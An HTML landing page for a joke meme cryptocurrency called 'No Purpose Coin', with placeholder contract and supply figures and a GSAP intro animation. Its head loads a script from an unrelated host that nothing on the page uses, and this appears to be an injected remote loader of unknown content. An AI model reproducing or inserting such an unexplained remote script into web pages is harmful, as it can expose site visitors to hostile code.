<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script>
  <link rel="stylesheet" href="css/main.css">
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&amp;display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.7.1/gsap.min.js"></script>
  

<body>
  <div id="root">
    <div class="container">
      <h1 class="logo-title">NO PURPOSE COIN</h1>
      <h2 class="sub-title">NO PURPOSE COIN (FOR NPCS)</h2>
      <div class="coin-wrapper">
        <img src="/images/meme.png" class="coin-image">
      </div>
      <div class="coin-info">
        NO PURPOSE COIN THIS COIN HAS NO PURPOSE <br> CONTRACT: 0X...... SUPPLY: 1234567891011 <br> LP: 92.41% RESERVE: 6.9% NO PURPOSE RESERVE:.69%
      </div>
      <div class="footer">Â© 2023 NPCS un-Inc.</div>
    </div>
  </div>

  <script>
    const tl = gsap.timeline({ defaults: { duration: 1 } });

    tl.from('.logo-title', { y: -50, opacity: 0, ease: 'power2.out' })
      .from('.sub-title', { y: -50, opacity: 0, ease: 'power2.out' }, '-=0.5')
      .from('.coin-wrapper', { y: -50, opacity: 0, ease: 'power2.out' }, '-=0.5')
      .from('.coin-info', { y: -50, opacity: 0, ease: 'power2.out' }, '-=0.5')
      .from('.footer', { y: 50, opacity: 0, ease: 'power2.out' }, '-=0.5');
  </script>
</body>

</html>
